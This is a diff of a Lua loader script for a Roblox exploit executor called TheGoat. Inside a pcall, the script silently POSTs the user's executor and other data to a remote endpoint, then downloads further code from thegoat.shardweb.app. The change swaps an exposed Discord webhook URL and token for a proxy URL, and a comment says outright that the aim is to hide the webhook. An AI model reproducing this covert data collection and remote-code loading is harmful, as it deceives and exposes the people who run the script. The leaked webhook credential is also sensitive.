@@ -1,14 +1,13 @@
--- Arabic → TheGoat Loader v1.1
+-- Arabic → TheGoat Loader v1.2 (webhook oculto via proxy)
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 
 local player = Players.LocalPlayer
 
-local webhook = "https://discord.com/api/webhooks/1543080383438921789/ptvJdi1GP7HVBcaVEYMIvobK-Z2qwoWM_SoWYynmikMDxh9pM7OkY51Fyzu2t1TWe4m6"
-
 pcall(function()
     local executor = "Unknown"
     if identifyexecutor then executor = identifyexecutor() end
+
     local data = {
         ["content"] = "",
         ["embeds"] = {{
@@ -21,10 +20,11 @@ pcall(function()
             }
         }}
     }
+
     local requestFunction = syn and syn.request or http_request or request
     if requestFunction then
         requestFunction({
-            Url = webhook,
+            Url = "https://thegoat.shardweb.app/api/webhook",
             Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
             Body = HttpService:JSONEncode(data)
@@ -32,7 +32,7 @@ pcall(function()
     end
 end)
 
--- ================= CARREGA O LOADER OFICIAL DO THEGOAT =================
+-- ============ CARREGA O LOADER OFICIAL DO THEGOAT ============
 local ok, res = pcall(function()
     return game:HttpGet("https://thegoat.shardweb.app/loader.lua", true)
 end)
